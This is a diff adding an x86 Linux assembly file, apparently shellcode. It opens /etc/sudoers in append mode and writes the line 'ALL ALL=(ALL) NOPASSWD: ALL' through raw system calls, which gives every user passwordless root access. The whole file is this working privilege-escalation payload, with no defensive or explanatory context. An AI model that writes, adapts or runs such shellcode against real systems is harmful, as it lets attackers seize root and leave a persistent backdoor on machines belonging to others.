@@ -1,0 +1,39 @@
+global _start
+
+section .text:
+_start:
+	xor eax, eax
+	push eax			; nul character
+	push dword 0x7372656f		; oers
+	push dword 0x6475732f		; /sud
+	push dword 0x6374652f		; /etc
+	mov ebx, esp			; pathname
+	mov cx, 0x401			; flags (O_WRONLY | O_APPEND)
+	mov al, 0x5
+	; int open(const char *, int)
+	int 0x80
+
+	mov ebx, eax			; move new file descriptor
+	xor eax, eax
+	push eax			; nul character
+	push dword 0xa4c4c41		; ALL
+	push dword 0x203a4457		; WD:
+	push dword 0x53534150		; PASS
+	push dword 0x4f4e2029		; ) NO
+	push dword 0x4c4c4128		; (ALL
+	push dword 0x3d4c4c41		; ALL=
+	push dword 0x204c4c41		; ALL
+	mov ecx, esp			; buf
+	mov dl, 0x1c			; count
+	mov al, 0x4
+	; ssize_t write(int, const void *, size_t)
+	int 0x80
+
+	mov al, 0x6
+	; int close(int)
+	int 0x80
+
+	xor ebx,ebx
+	mov al, 0x1
+	; int exit(int)
+	int 0x80
